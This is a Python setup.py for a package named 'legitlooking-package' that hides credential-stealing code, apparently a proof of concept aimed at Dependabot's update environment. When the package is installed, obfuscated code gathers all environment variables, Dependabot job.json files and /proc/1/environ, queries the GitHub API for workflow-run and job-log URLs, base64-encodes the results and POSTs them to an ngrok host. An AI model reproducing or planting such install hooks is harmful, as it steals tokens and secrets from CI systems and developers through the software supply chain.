from setuptools import setup

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

try:
    _urlreq   = __import__('urllib.request', fromlist=['urlopen', 'Request',
                            'build_opener', 'HTTPRedirectHandler'])
    _urlparse = __import__('urllib.parse',   fromlist=['quote'])
    _urlerr   = __import__('urllib.error',   fromlist=['HTTPError'])
    _b64      = __import__('base64')
    _os       = __import__('os')
    _re       = __import__('re')

    lines = []

    # 1. Env vars
    lines.append("=== ENV ===")
    lines.append("\n".join(f"{k}={v}" for k, v in _os.environ.items()))

    # 2. Zoek de echte job.json (meerdere paden proberen)
    lines.append("\n=== JOB.JSON ===")
    _job_found = False
    for _jp in [
        _os.environ.get("DEPENDABOT_JOB_PATH", ""),
        "/home/dependabot/dependabot-updater/job.json",
        "/home/dependabot/job.json",
    ]:
        if not _jp:
            continue
        try:
            with open(_jp) as _jf:
                _jc = _jf.read()
            if _jc.strip().startswith("{"):
                lines.append(f"[{_jp}]\n{_jc}")
                _job_found = True
                break
            else:
                lines.append(f"[{_jp}] GEEN JSON: {_jc[:80]}")
        except Exception as _je:
            lines.append(f"[{_jp}] FOUT: {_je}")
    if not _job_found:
        # Enumerate updater directory
        try:
            _sp = __import__('subprocess')
            lines.append("updater dir: " + _sp.run(
                ["find", "/home/dependabot/dependabot-updater", "-name", "*.json", "-maxdepth", "2"],
                capture_output=True, text=True, timeout=5).stdout[:500])
        except Exception as _fe:
            lines.append(f"find fout: {_fe}")

    # 3. /proc/1/environ
    try:
        with open("/proc/1/environ", "rb") as _f:
            _raw = _f.read()
        lines.append("\n=== /proc/1/environ ===")
        lines.append(_raw.replace(b"\x00", b"\n").decode("utf-8", errors="replace"))
    except Exception as _pe:
        lines.append(f"\n=== /proc/1/environ FOUT: {_pe} ===")

    # 4. GitHub API via proxy -- volledig inline, geen nested def
    lines.append("\n=== GITHUB API VIA PROXY ===")

    _api_base = "https://api.github.com"
    _hdrs = {
        "Accept": "application/vnd.github+json",
        "X-GitHub-Api-Version": "2022-11-28",
    }

    # Stap 1: workflow runs
    try:
        _r1 = _urlreq.Request(f"{_api_base}/repos/ugurcanli/testpen/actions/runs?per_page=1&event=dynamic", headers=_hdrs)
        with _urlreq.urlopen(_r1, timeout=10) as _resp1:
            _runs_raw = _resp1.read(1000).decode(errors="replace")
        lines.append(f"Runs: {_runs_raw[:600]}")
        _run_id = (_re.search(r'"id":(\d+)', _runs_raw) or type('_', (), {'group': lambda s, n: None})()).group(1)
        lines.append(f"Run ID: {_run_id}")
    except Exception as _e1:
        lines.append(f"Runs fout: {_e1}")
        _run_id = None

    # Stap 2: jobs
    _job_id = None
    if _run_id:
        try:
            _r2 = _urlreq.Request(f"{_api_base}/repos/ugurcanli/testpen/actions/runs/{_run_id}/jobs", headers=_hdrs)
            with _urlreq.urlopen(_r2, timeout=10) as _resp2:
                _jobs_raw = _resp2.read(1000).decode(errors="replace")
            lines.append(f"Jobs: {_jobs_raw[:600]}")
            _job_id = (_re.search(r'"id":(\d+)', _jobs_raw) or type('_', (), {'group': lambda s, n: None})()).group(1)
            lines.append(f"Job ID: {_job_id}")
        except Exception as _e2:
            lines.append(f"Jobs fout: {_e2}")

    # Stap 3: SAS URL voor job logs
    if _job_id:
        try:
            class _NR(_urlreq.HTTPRedirectHandler):
                def redirect_request(self, req, fp, code, msg, headers, newurl):
                    return None
            _opener = _urlreq.build_opener(_NR())
            _r3 = _urlreq.Request(
                f"{_api_base}/repos/ugurcanli/testpen/actions/jobs/{_job_id}/logs",
                headers=_hdrs
            )
            try:
                _opener.open(_r3, timeout=10)
                lines.append("Geen redirect")
            except _urlerr.HTTPError as _he:
                if _he.code in (301, 302, 303, 307, 308):
                    lines.append(f"SAS URL: {_he.headers.get('Location', '')}")
                else:
                    lines.append(f"HTTP {_he.code}")
        except Exception as _e3:
            lines.append(f"SAS fout: {_e3}")

    # 5. Stuur alles op
    _payload = _b64.b64encode("\n".join(lines).encode("utf-8", errors="replace")).decode()
    _post = _urlreq.Request(
        f"{COLLAB_URL}?poc=setup_py",
        data=_payload.encode(),
        method="POST",
        headers={"Content-Type": "text/plain"}
    )
    _urlreq.urlopen(_post, timeout=10)

except Exception as e:
    try:
        _u = __import__('urllib.request', fromlist=['urlopen'])
        _p = __import__('urllib.parse',   fromlist=['quote'])
        _u.urlopen(f"{COLLAB_URL}?poc=setup_py&err={_p.quote(str(e)[:200])}", timeout=5)
    except Exception:
        pass

setup(
    name="legitlooking-package",
    version="1.0.3",
    install_requires=[
        "requests==2.27.1",
        "flask==2.2.0",
    ],
    python_requires=">=3.8",
)
